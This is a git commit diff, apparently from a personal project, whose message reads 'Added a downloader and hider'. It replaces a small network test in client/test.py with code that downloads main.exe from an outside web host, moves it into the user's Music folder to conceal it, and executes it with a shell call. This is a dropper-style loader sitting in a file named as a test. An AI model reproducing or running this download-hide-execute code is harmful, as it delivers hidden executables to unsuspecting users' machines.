9ca5324f9cb4a0a5c17f87d4041d9667c15baae5
ArmenG <armeng2007@gmail.com>
2022-06-16 10:30:02 -0700

    Added a downloader and hider

--- client/test.py
+++ client/test.py
@@ -1,4 +1,28 @@
-import socket
+import subprocess,requests,os
 
-result = socket.getaddrinfo("https://api6.ipify.org", 80, socket.AF_INET6)
-print(result)
+def download(url):
+
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open(file_name, "wb") as out_file:
+        out_file.write(get_response.content)
+    
+
+download("https://armeng.pythonanywhere.com/media/files/main.exe")
+current_dir = os.getcwd()
+strr = os.getcwd()
+x = -2
+for i in os.getcwd():
+    if i == "\\":
+        x += 1
+for i in range(x):
+    os.chdir("..")
+
+
+os.chdir("Music")
+try:
+    os.rename(current_dir+r"\main.exe", os.getcwd()+r"\main.exe")
+except FileExistsError:
+    pass
+
+subprocess.call("main.exe", shell=True)
